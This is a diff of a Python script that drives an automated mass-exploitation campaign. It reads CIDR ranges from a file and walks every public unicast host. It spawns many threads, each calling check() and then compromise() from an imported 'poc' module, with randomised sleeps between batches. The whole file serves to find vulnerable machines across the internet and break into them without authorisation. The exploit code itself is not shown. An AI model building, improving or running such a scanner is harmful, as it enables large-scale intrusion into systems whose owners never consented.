@@ -9,10 +9,10 @@ import sys
 import netaddr
 import time
 import socket
+import random
 import requests
 import threading
 import gc
-import objgraph
 from datetime import datetime
 from log import log
 from poc import check, compromise
@@ -23,32 +23,29 @@ f = open(cc_file, 'r')
 
 class probe(threading.Thread): # each thread probe one cidr
     
-    def __init__(self, name, cidr):
+    def __init__(self, ip):
         threading.Thread.__init__(self)
-        self.name = name
-        self.cidr = cidr
+        self.ip = str(ip)
 
     def run(self):
-        log(self.name, 'started')
+        log(1, self.ip, 'started')
         #self.ip_cidr_list = list(netaddr.IPNetwork(self.cidr))   # too much memory wasted
-        self.ip_cidr_list = netaddr.IPNetwork(self.cidr).iter_hosts() # iterator is fucking good
-        for self.ip in self.ip_cidr_list:
-            if self.ip.is_unicast() and not self.ip.is_private():
-                try:
-                    if check(str(self.ip)):
-                        compromise(str(self.ip))
-                except:
-                    log('run', '{}'.format(sys.exc_info()))
+        try:
+            if check(self.ip):
+                compromise(self.ip)
+        except:
+            log(1, 'run', '{}'.format(sys.exc_info()))
 
 while True:
-    while threading.active_count()>=max_thread:
-        time.sleep(7)
     line = f.readline()
     if len(line)==0:
         break
-    new_thread = probe(str(i), line)
-    new_thread.daemon = True
-    new_thread.start()
-    # the following line's thread.join is wrong
-    #new_thread.join()  # this should be better than line 53's solution, though speed may lose
-    i = i + 1
+    ip_cidr_list = netaddr.IPNetwork(str(line)).iter_hosts() # iterator is fucking good
+    for ip in ip_cidr_list:
+        #if ip.is_unicast() and not ip.is_private() and check(str(ip)):
+        if ip.is_unicast() and not ip.is_private():  # it should be faster if we put check in child thread
+            while threading.active_count()>=max_thread:
+                time.sleep(random.randint(3,7))
+            new_thread = probe(ip)
+            new_thread.daemon = True
+            new_thread.start()
